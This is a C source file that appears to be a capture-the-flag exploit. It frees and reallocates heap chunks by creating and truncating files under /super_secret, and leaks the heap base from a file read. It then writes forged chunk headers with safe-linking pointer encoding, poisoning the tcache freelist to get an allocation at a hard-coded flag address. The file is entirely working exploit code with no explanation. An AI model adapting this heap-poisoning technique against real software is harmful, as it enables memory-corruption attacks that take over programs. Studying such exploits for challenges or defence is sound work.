#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

size_t enc(size_t new, size_t old){
        return (new >> 12) ^ old;
}

int main(){
        char* buf = malloc(0x1000);
        memset(buf, 0, 0x1000);
        int fd = open("/super_secret/a", O_RDWR | O_CREAT);
        close(fd);
        int fd2 = open("/super_secret/b", O_RDWR | O_CREAT);
        close(fd2);
        truncate("/super_secret/a", 0);
        truncate("/super_secret/b", 0);
        fd = open("/super_secret/c", O_RDWR | O_CREAT);
                size_t addr;
        read(fd, &addr, 8);
        addr -= 0x22000;
        addr &= 0xFFFFF000;
        printf("heap base : %#llx\n", addr);
        fd2 = open("/super_secret/aa", O_RDWR | O_CREAT);
        truncate("/super_secret/aa", 0x1000);
        write(fd2, buf, 0x510);
        truncate("/super_secret/aa", 0x500);
        int fd3 = open("/super_secret/e", O_RDWR | O_CREAT);
        int fd4 = open("/super_secret/d", O_RDWR | O_CREAT);
        close(fd3);
        close(fd4);
        truncate("/super_secret/e", 0);
        truncate("/super_secret/d", 0);
        size_t heap1 = addr + 0x021aa0 + 0x10; //0x40 size heap
        size_t heap2 = addr + 0x021ae0 + 0x10; //0x40 size heap
        size_t heap3 = addr + 0x021b20 + 0x10; //0x110 size heap
        size_t flag = 0x404090; //flag address
        size_t* ptr = (size_t*)buf;
        *ptr++ = enc(heap1, 0);
        *ptr++ = 0;
        ptr += 5;
        *ptr++ = 0x41;
        *ptr++ = enc(heap2, heap1);
        *ptr = 0;
        ptr += 7;
        *ptr++ = enc(heap3, flag);
        *ptr++ = 0x0;
        write(fd2, buf, 0xb0);
        int fd5 = open("/super_secret/cccc", O_RDWR | O_CREAT);
        int fd6 = open("/super_secret/fake_flag", O_RDWR | O_CREAT);
}